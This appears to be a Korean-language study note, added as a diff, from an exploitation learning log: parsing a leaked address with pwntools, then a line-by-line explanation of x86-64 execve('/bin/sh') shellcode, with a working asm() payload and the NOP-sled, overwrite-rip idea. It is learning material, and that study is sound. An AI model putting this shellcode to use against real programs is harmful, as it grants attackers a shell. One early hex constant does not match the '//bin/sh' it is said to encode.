@@ -1,0 +1,64 @@
+##day48 - 1 안전한 파싱
+
+leak된값 파싱은 먼저 출력해보는게 가장 안전
+
+raw = p.recvline()
+log.info(f"raw={repr(raw)} len={len(raw)} hex={raw.hex()}")
+
+leak = raw.rstrip(b"\n")
+addr = u64(leak.ljust(8, b"\x00"))
+
+log.info(f"addr={hex(addr)}")
+
+이런식으로 출력 습관화
+
+strip() 대신 rstrip(b"\n")
+
+##day48 - 2 shellcode
+
+## 목표
+
+execve("/bin/sh", NULL, NULL)
+
+rax = syscall 번호
+rdi = 1번째 인자
+rsi = 2번째 인자
+rdx = 3번째 인자
+syscall 실행
+
+execve의 syscall 번호 : 59
+즉
+rax = 59
+rdi = "/bin/sh" 주소
+rsi = 0
+rdx = 0
+
+어셈블리로는
+xor rsi, rsi - 두번쨰 인자 rsi = rsi xor rsi 즉 rsi = 0
+xor rdx, rdx - 세번쨰 인자 rsi와 동일한 동작
+mov rbx, 0x68732f6e69622f rbx = //bin/sh 널바이트를 피하기 위해 앞에 /를 두개 넣는다 결국 /bin/sh로 해석
+push rbx - /bin/sh를 스택에 push . push rbx 의 의미는 sub rsp, 8  [rsp] = rbx
+mov rdi, rsp - rdi = rsp - 왜 rdi에 문자를 그대로 넣지않냐 지금 [rsp]는 0x0068732f6e69622f 이런 상태 이걸 리틀엔디언으로 보면
+/bin/sh 지만 이 값을 rdi에 그대로 넣게되면 0x0068732f6e69622f라는 주소를 가리키게 된다
+mov rax, 59 - syscall 번호
+syscall
+
+핵심은 buf주소 rip에 buf 주소를 넣는것
+buf안에는 쉘코드 즉 payload를 입력 남는 공간은 nop 0x90으로 채운다 
+
+sc = asm("""
+xor rsi, rsi
+push rsi
+mov rbx, 0x68732f6e69622f2f
+push rbx
+mov rdi, rsp
+xor rdx, rdx
+push 59
+pop rax
+syscall
+""")
+
+이게 어셈블리 push rsi는 왜 하냐?
+저건 인자 세팅을 위한게 아님 문자열은 c 기준 끝에 null이 있어야 하는데 rbx에 넣은값에는 null이 없다
+그래서 0인 rsi를 먼저 스택에 올려놓고 - null 생성 그 다음 push rbx rsi가 저장된 스택 그 앞에 저장된다 그럼 스택은
+rsp → //bin/sh 00 00 00 00 00 00 00 00 이렇게 된다 그럼 실제 문자열은 //bin/sh\0 이런식
